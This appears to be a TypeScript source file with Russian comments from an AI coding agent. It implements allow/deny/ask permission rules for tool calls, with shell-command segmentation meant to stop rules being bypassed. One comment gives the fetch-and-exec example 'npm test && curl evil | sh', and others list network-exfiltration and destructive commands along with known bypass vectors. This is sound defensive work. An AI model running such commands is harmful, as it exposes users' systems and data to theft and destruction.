/**
 * Декларативные permission-правила allow/deny/ask по паттернам — поверх 5 режимов.
 *
 * Аналог Claude Code settings.json permissions / Cursor auto-run allowlist. У Verstak
 * есть 5 ГЛОБАЛЬНЫХ режимов (ask/accept/plan/auto/bypass) + per-tool auto-approve
 * (категории) + bash-allowlist (только префиксы bash). Чего НЕ было: единого
 * декларативного слоя «разреши Bash(npm:*), спрашивай на git push, запрети rm,
 * разреши Read(src/**)» по ЛЮБЫМ тулзам, поверх режима. Это даёт тонкую автономность
 * без переключения всего режима — прямое усиление moat «контроль».
 *
 * Конфиг (JSON):
 *   ~/.verstak/permissions.json       — user-scope (глобальные)
 *   {project}/.verstak/permissions.json — project-scope (мерджится, добавляется)
 * Формат: { "allow": ["Bash(npm:*)", "Read(src/**)"], "deny": ["Bash(rm:*)"], "ask": ["Bash(git push:*)"] }
 *
 * Семантика (как Claude Code): deny > ask > allow. deny — абсолютный (бьёт даже bypass).
 * Правила НЕ ослабляют plan-режим (block остаётся). allow повышает confirm→auto,
 * ask понижает auto→confirm.
 */

import { readFileSync, writeFileSync, mkdirSync, renameSync } from 'fs'
import { join } from 'path'
import { homedir } from 'os'
import { decide, type AgentMode, type AutoApprove, type ToolDecision } from './mode-policy'

export type RuleDecision = 'allow' | 'deny' | 'ask'

export interface PermissionRule {
  /** Канонизированное имя тула (run_command/read_file/write_file/...). */
  tool: string
  /** Скомпилированный матчер аргумента (команда/путь). null = матчит любой вызов тула. */
  argMatcher: ((argText: string) => boolean) | null
  /** Исходная строка правила (для сообщений). */
  raw: string
}

export interface CompiledPermissionRules {
  allow: PermissionRule[]
  deny: PermissionRule[]
  ask: PermissionRule[]
}

/** Дружелюбные алиасы → канонические имена тулзов Verstak. Bash≡run_command и т.п. */
const TOOL_ALIASES: Record<string, string[]> = {
  bash: ['run_command'],
  shell: ['run_command'],
  cmd: ['run_command'],
  read: ['read_file'],
  write: ['write_file', 'apply_patch', 'propose_edits'],
  edit: ['apply_patch', 'propose_edits'],
}

/** Развернуть имя тула из правила в набор канонических имён, по которым матчим. */
export function expandToolName(name: string): string[] {
  const low = name.trim().toLowerCase()
  return TOOL_ALIASES[low] ?? [name.trim()]
}

// Разбить команду на исполняемые сегменты для матчинга префикс-правил. Иначе deny
// тривиально обходится цепочкой/обёрткой/подстановкой: `npm test && git push`,
// `sudo rm x`, `echo $(rm x)`, `(rm x)`, `find . -exec rm {} +` (ревью HIGH×2).
// ВАЖНО (честно, как bash-allowlist): regex не парсит shell идеально — это хардинг,
// поднимающий планку (закрывает распространённые обфускации), НЕ песочница. Остаются
// экзотические векторы (\rm, /bin/rm, индирекция через переменную) — для настоящей
// изоляции нужна OS-песочница (осознанный non-goal). Для deny (провал = запрещённое
// исполнилось) бьём по всем известным обёрткам и извлекаем вложенные команды.
const SEGMENT_SPLIT = /\s*(?:&&|\|\||[;|&\n])\s*/   // + одиночный & (фоновый запуск)
const ENV_ASSIGN_RE = /^(?:[A-Za-z_]\w*=\S*\s+)+/
const GROUP_OPEN_RE = /^[({]\s*/                     // ведущая группа ( или {
const WRAPPER_WORDS = /^(?:sudo|doas|nice|command|builtin|exec|nohup|stdbuf|watch|timeout|time|xargs|env)\b/i
const SHELL_C_RE = /^(?:bash|sh|zsh|dash|pwsh|powershell)\s+-c\s+['"]?/i
// Извлечь содержимое подстановок/групп: $(...), `...`, <(...), >(...), (...), {...}.
// innermost-first ([^()]* не матчит вложенные скобки) — внешние распутываются итерацией.
const NESTED_RE = /[$<>]?\(([^()]*)\)|`([^`]*)`|\{([^{}]*)\}/

/** Вынести вложенные команды (подстановки/группы) как отдельные блоки + остаток. */
function extractNested(command: string): string[] {
  const parts: string[] = []
  let work = command
  for (let i = 0; i < 50; i++) {
    const m = work.match(NESTED_RE)
    if (!m || m.index === undefined) break
    const inner = m[1] ?? m[2] ?? m[3] ?? ''
    if (inner.trim()) parts.push(inner)
    work = work.slice(0, m.index) + ' ' + work.slice(m.index + m[0].length)
  }
  parts.push(work)
  return parts
}

/** Снять обёртки (sudo/env/timeout/bash -c/группы) и env-присвоения с одного сегмента. */
function stripWrappers(seg: string): string {
  let s = seg.trim()
  let prev: string
  do {
    prev = s
    s = s.replace(GROUP_OPEN_RE, '')
    s = s.replace(ENV_ASSIGN_RE, '')
    const w = s.match(WRAPPER_WORDS)
    if (w) {
      s = s.slice(w[0].length).trim()
      // снять флаги/числа-аргументы обёртки: timeout 5 / stdbuf -oL / nice -n 10 / watch -n2
      s = s.replace(/^(?:-\S+\s+|\d+\S*\s+)+/, '')
    }
    s = s.replace(SHELL_C_RE, '')
    s = s.replace(/^['"]/, '')
  } while (s !== prev)
  return s.replace(/\s+/g, ' ').trim()
}

/** Сегменты команды со снятыми обёртками + извлечёнными вложенными командами. */
export function splitCommandSegments(command: string): string[] {
  const out: string[] = []
  for (const block of extractNested(command)) {
    for (const raw of block.split(SEGMENT_SPLIT)) {
      const seg = stripWrappers(raw)
      if (seg) out.push(seg)
      // find ... -exec[dir] CMD ... \; / + — выделить под-команду после -exec
      const exec = raw.match(/-exec(?:dir)?\s+(.+?)(?:\s+(?:\\?;|\+)\s*)?$/i)
      if (exec) { const sub = stripWrappers(exec[1]); if (sub) out.push(sub) }
    }
  }
  return out.filter(Boolean)
}

/**
 * Скомпилировать паттерн аргумента в матчер.
 * - `npm:*`     → префикс по первому токену (команда начинается с "npm")
 * - `git push:*` → префикс "git push"
 * - `src/**`    → glob по пути
 * - `*.env`     → glob
 * Пусто/нет скобок → null (матчит любой вызов тула).
 */
export function compileArgMatcher(pattern: string | null): ((argText: string) => boolean) | null {
  if (pattern === null) return null
  const p = pattern.trim()
  if (p === '' || p === '*' || p === '**') return null
  // `prefix:*` — префиксный матч (Claude Code Bash(npm:*) семантика). Матчим КАЖДЫЙ
  // сегмент команды — иначе deny обходится цепочкой/обёрткой (ревью HIGH).
  if (p.endsWith(':*')) {
    const prefix = p.slice(0, -2).trim().replace(/\s+/g, ' ')
    return (argText: string) => splitCommandSegments(argText).some(seg => seg.startsWith(prefix))
  }
  // Иначе — glob: * → [^/]* (в пределах сегмента), ** → .* , экранируем спецсимволы
  const re = globToRegExp(p)
  return (argText: string) => re.test(argText.trim())
}

function globToRegExp(glob: string): RegExp {
  let out = ''
  for (let i = 0; i < glob.length; i++) {
    const c = glob[i]
    if (c === '*') {
      if (glob[i + 1] === '*') { out += '.*'; i++ } // ** → любой путь
      else out += '[^/]*'                            // * → в пределах сегмента
    } else if ('+?.()|[]{}^$\\'.includes(c)) {
      out += '\\' + c
    } else {
      out += c
    }
  }
  return new RegExp('^' + out + '$')
}

/** Распарсить одну строку правила вида `Tool(arg-pattern)` или `Tool`. */
export function parseRule(raw: string): PermissionRule[] {
  const s = raw.trim()
  if (!s) return []
  const m = s.match(/^([A-Za-z_][\w-]*)\s*(?:\((.*)\))?$/)
  if (!m) return []
  const toolPart = m[1]
  const argPattern = m[2] !== undefined ? m[2] : null
  const matcher = compileArgMatcher(argPattern)
  return expandToolName(toolPart).map(tool => ({ tool, argMatcher: matcher, raw: s }))
}

function parseRuleList(list: unknown): PermissionRule[] {
  if (!Array.isArray(list)) return []
  const out: PermissionRule[] = []
  for (const item of list) {
    if (typeof item === 'string') out.push(...parseRule(item))
  }
  return out
}

/** Скомпилировать объект {allow,deny,ask} из JSON. */
export function compilePermissionConfig(raw: unknown): CompiledPermissionRules {
  const obj = (raw && typeof raw === 'object') ? raw as Record<string, unknown> : {}
  return {
    allow: parseRuleList(obj.allow),
    deny: parseRuleList(obj.deny),
    ask: parseRuleList(obj.ask),
  }
}

function readConfigFile(path: string): unknown {
  try { return JSON.parse(readFileSync(path, 'utf8')) } catch { return null }
}

/**
 * Загрузить и скомпилировать permission-правила: user (~/.verstak) + project.
 * Project ДОБАВЛЯЕТСЯ к user (не перебивает) — оба набора применяются, deny из любого
 * источника выигрывает. Пустой результат, если файлов нет (no-op, обратная совместимость).
 */
export function loadPermissionRules(projectPath: string | null): CompiledPermissionRules {
  const userCfg = compilePermissionConfig(readConfigFile(join(homedir(), '.verstak', 'permissions.json')))
  const merged: CompiledPermissionRules = { allow: [...userCfg.allow], deny: [...userCfg.deny], ask: [...userCfg.ask] }
  if (projectPath) {
    const projCfg = compilePermissionConfig(readConfigFile(join(projectPath, '.verstak', 'permissions.json')))
    merged.allow.push(...projCfg.allow)
    merged.deny.push(...projCfg.deny)
    merged.ask.push(...projCfg.ask)
  }
  return merged
}

// Persistent per-command approvals (Codex prefix_rule). При одобрении команды юзер
// может «запомнить» её → выводим prefix-паттерн и дописываем в permissions.json как
// allow-правило. Будущие сессии авто-разрешают (loadPermissionRules подхватит).
// Ревью HIGH (H2 + ре-ревью): денилист опасных команд/субкоманд протекает по неполноте
// (первый ревью пропустил npm install/git submodule/kubectl apply/go install/… — все RCE).
// Инвертируем на ALLOWLIST безопасных для бланкетного allow операций (инспекция/тест/
// сборка — НЕ fetch-and-exec, НЕ мутация системы). Что НЕ в списке — не запоминаем
// (команда всё равно выполнится разово по одобрению юзера, просто без персистентного allow).
// Инструменты-обёртки: запоминаем только известную безопасную субкоманду.
const SAFE_SUBCOMMANDS: Record<string, Set<string>> = {
  git: new Set(['status', 'log', 'diff', 'show', 'branch', 'describe', 'blame', 'tag', 'remote', 'rev-parse', 'ls-files', 'ls-remote', 'shortlog', 'reflog', 'whatchanged', 'grep', 'cat-file', 'symbolic-ref', 'name-rev', 'count-objects', 'var', 'check-ignore']),
  npm: new Set(['test', 'ls', 'list', 'outdated', 'view', 'why', 'ping', 'audit', 'root', 'prefix', 'bin', 'docs', 'help', 'version']),
  yarn: new Set(['test', 'list', 'why', 'outdated', 'audit', 'info', 'versions', 'help']),
  pnpm: new Set(['test', 'list', 'why', 'outdated', 'audit', 'root', 'help']),
  docker: new Set(['ps', 'images', 'logs', 'inspect', 'version', 'info', 'top', 'port', 'diff', 'stats', 'history', 'search']),
  kubectl: new Set(['get', 'describe', 'logs', 'top', 'version', 'explain', 'api-resources', 'api-versions', 'cluster-info']),
  cargo: new Set(['build', 'test', 'check', 'tree', 'metadata', 'version', 'fmt', 'clippy', 'bench', 'doc']),
  go: new Set(['build', 'test', 'vet', 'version', 'env', 'list', 'doc', 'fmt']),
  pip: new Set(['list', 'show', 'freeze', 'check', 'help']),
  pip3: new Set(['list', 'show', 'freeze', 'check', 'help']),
  dotnet: new Set(['build', 'test', 'list']),
  brew: new Set(['list', 'info', 'outdated', 'deps', 'config', 'doctor']),
  apt: new Set(['list', 'show', 'search', 'policy'])
}
// Безопасные одиночные команды (чтение/инспекция/тест/линт/формат/typecheck/сборка).
// НЕ включаем: rm/dd/mkfs (деструктив), curl/wget/ssh/nc (сеть-эксфильтрация),
// bash/sh/python/node/eval (произвольное исполнение), npx (fetch-and-exec), make/mvn/
// gradle (произвольные таргеты), env/sudo/xargs/find (обёртки/подстановка).
const SAFE_COMMANDS = new Set([
  'ls', 'cat', 'head', 'tail', 'grep', 'rg', 'fd', 'wc', 'sort', 'uniq', 'cut', 'tr',
  'echo', 'pwd', 'whoami', 'hostname', 'date', 'uptime', 'df', 'du', 'free', 'which',
  'whereis', 'type', 'file', 'stat', 'tree', 'diff', 'cmp', 'true', 'false',
  'tsc', 'eslint', 'prettier', 'jest', 'vitest', 'mocha', 'pytest', 'tox', 'flake8',
  'black', 'ruff', 'mypy', 'pylint', 'gofmt', 'rustfmt', 'vite', 'esbuild', 'tsx'
])

/** Вывести prefix-правило из одобренного вызова. Только для БЕЗОПАСНЫХ операций
 *  (allowlist) — чтобы бланкетный allow не открыл RCE/деструктив. Возвращает строку
 *  правила (`Bash(git status:*)`) или null (не запоминаем — re-prompt каждый раз). */
export function derivePrefixRule(toolName: string, argText: string): string | null {
  if (toolName === 'run_command' || toolName === 'run_until_green') {
    const words = argText.trim().split(/\s+/).filter(Boolean)
    if (!words.length) return null
    // Канонизируем имя: basename без пути/расширения — иначе `/usr/bin/rm`, `rm.exe`,
    // `.\curl` обходили бы allowlist по первому слову.
    const base = words[0].toLowerCase().split(/[/\\]/).pop()!.replace(/\.(exe|cmd|bat|com|ps1)$/, '')
    const safeSubs = SAFE_SUBCOMMANDS[base]
    if (safeSubs) {
      // Инструмент-обёртка: второе слово должно быть настоящей безопасной субкомандой
      // (не флаг `git -c ...`, не отсутствовать «весь git», не мутация/fetch-exec).
      if (!words[1] || words[1].startsWith('-')) return null
      if (!safeSubs.has(words[1].toLowerCase())) return null
      return `Bash(${words[0]} ${words[1]}:*)`
    }
    if (SAFE_COMMANDS.has(base)) return `Bash(${words[0]}:*)`
    return null // неизвестная/опасная команда — не запоминаем
  }
  if (toolName === 'connector_query') {
    const id = argText.trim()
    return id ? `connector_query(${id})` : null
  }
  return null  // V1: запоминаем только команды/коннекторы (файловые правки — по режиму)
}

/** Дописать allow-правило в user-scope permissions (~/.verstak/permissions.json).
 *  Идемпотентно (дубли не плодит). Возвращает true если добавлено, false если уже было. */
export function rememberApproval(rule: string): boolean {
  const dir = join(homedir(), '.verstak')
  const path = join(dir, 'permissions.json')
  let cfg: { allow?: string[]; deny?: string[]; ask?: string[] } = {}
  try { cfg = JSON.parse(readFileSync(path, 'utf8')) } catch { /* нет файла — создаём */ }
  const allow = Array.isArray(cfg.allow) ? cfg.allow : []
  if (allow.includes(rule)) return false
  allow.push(rule)
  cfg.allow = allow
  try { mkdirSync(dir, { recursive: true }) } catch { /* ignore */ }
  // Атомарно (ревью M2): temp + rename, чтобы параллельная запись/краш не оставили
  // усечённый JSON. Идемпотентность (includes выше) отсекает дубли в рамках процесса.
  const tmp = join(dir, `permissions.${process.pid}.tmp`)
  writeFileSync(tmp, JSON.stringify(cfg, null, 2), 'utf8')
  renameSync(tmp, path)
  return true
}

function ruleMatches(rules: PermissionRule[], toolName: string, argText: string): PermissionRule | null {
  for (const r of rules) {
    if (r.tool !== toolName) continue
    if (r.argMatcher === null || r.argMatcher(argText)) return r
  }
  return null
}

const COMMAND_TOOLS = new Set(['run_command', 'run_until_green'])

/**
 * Ревью HIGH: для ALLOW нужна семантика «покрыт КАЖДЫЙ сегмент» (в отличие от deny/ask,
 * где `.some` — «сматчил хоть один» — корректно). Иначе allow-правило `Bash(npm test:*)`
 * авто-одобряло бы `npm test && curl evil | sh` (один безопасный сегмент открывал всю
 * цепочку). Для команд разбиваем на сегменты и требуем, чтобы каждый был покрыт неким
 * allow-правилом; для не-команд (пути/коннекторы, не составные) — обычный ruleMatches.
 */
function allowMatchesCommand(rules: PermissionRule[], toolName: string, argText: string): PermissionRule | null {
  if (!COMMAND_TOOLS.has(toolName)) return ruleMatches(rules, toolName, argText)
  const segs = splitCommandSegments(argText)
  if (segs.length === 0) return ruleMatches(rules, toolName, argText)
  let covering: PermissionRule | null = null
  for (const seg of segs) {
    const r = rules.find(rr => rr.tool === toolName && (rr.argMatcher === null || rr.argMatcher(seg)))
    if (!r) return null // сегмент не покрыт ни одним allow → allow не применяется
    covering = covering ?? r
  }
  return covering // все сегменты покрыты
}

/**
 * Применить правила к (тул, аргумент). deny > ask > allow. null — ни одно не сматчило.
 */
export function applyPermissionRules(
  toolName: string,
  argText: string,
  rules: CompiledPermissionRules | undefined
): { decision: RuleDecision; rule: PermissionRule } | null {
  if (!rules) return null
  const d = ruleMatches(rules.deny, toolName, argText)
  if (d) return { decision: 'deny', rule: d }
  const a = ruleMatches(rules.ask, toolName, argText)
  if (a) return { decision: 'ask', rule: a }
  const al = allowMatchesCommand(rules.allow, toolName, argText)
  if (al) return { decision: 'allow', rule: al }
  return null
}

/** Достать «аргумент» вызова для матчинга правил: команда / путь / коннектор. */
export function extractArgText(toolName: string, args: Record<string, unknown> | undefined): string {
  if (!args) return ''
  switch (toolName) {
    case 'run_command':
    case 'run_until_green':
      return String(args.command ?? '')
    case 'read_file':
    case 'write_file':
    case 'apply_patch':
    case 'propose_edits':
    case 'edit_spreadsheet':
    case 'read_spreadsheet':
    case 'read_document':
      return String(args.path ?? '')
    case 'connector_query':
      return String(args.connector ?? args.id ?? '')
    default:
      return ''
  }
}

/**
 * Итоговое решение по вызову с учётом режима И permission-правил.
 * Заменяет голый decide() в хендлерах. Семантика:
 *   - deny-правило → block ВСЕГДА (бьёт даже bypass);
 *   - plan-режим (base===block) → block, правила НЕ ослабляют;
 *   - ask-правило → confirm (понижает auto→confirm);
 *   - allow-правило → auto-accept (повышает confirm→auto);
 *   - иначе → решение режима (с учётом per-tool auto-approve).
 */
export function resolveDecision(
  toolName: string,
  args: Record<string, unknown> | undefined,
  mode: AgentMode,
  autoApprove: AutoApprove | undefined,
  rules: CompiledPermissionRules | undefined
): { decision: ToolDecision; reason?: string } {
  const base = decide(toolName, mode, autoApprove)
  const argText = extractArgText(toolName, args)
  const rule = applyPermissionRules(toolName, argText, rules)

  if (rule?.decision === 'deny') {
    return { decision: 'block', reason: `Заблокировано правилом permissions: deny "${rule.rule.raw}".` }
  }
  if (base === 'block') return { decision: 'block' } // plan-режим строг, правила не ослабляют
  if (rule?.decision === 'ask') return { decision: 'confirm' }
  if (rule?.decision === 'allow') return { decision: 'auto-accept' }
  return { decision: base }
}
